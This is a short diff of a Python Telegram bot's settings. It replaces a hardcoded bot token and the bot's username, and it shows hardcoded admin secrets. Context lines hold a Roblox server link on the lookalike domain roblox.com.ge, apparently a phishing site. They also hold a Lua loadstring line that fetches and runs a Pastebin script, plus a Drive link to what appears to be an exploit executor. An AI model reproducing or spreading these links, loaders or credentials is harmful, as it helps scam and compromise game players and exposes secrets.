@@ -7,7 +7,7 @@ import socket
 from threading import Thread
 import uuid
 
-TOKEN = os.environ.get("TOKEN", "8793302361:AAGPBeobA4arew9kv09Zm1dDQ-wZSyTi65k")
+TOKEN = os.environ.get("TOKEN", "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM")
 ADMIN_ID = 8091608667
 ADMIN_SECRET = "larscriptkryyyyyyt"
 ADMIN_SECRET2 = "кресло качалка"
@@ -107,7 +107,7 @@ KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR",
 PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
 SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
 DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
-BOT_USERNAME = "script8748389538954939_bot"
+BOT_USERNAME = "larskeys_bot"
 
 bot = telebot.TeleBot(TOKEN)
 
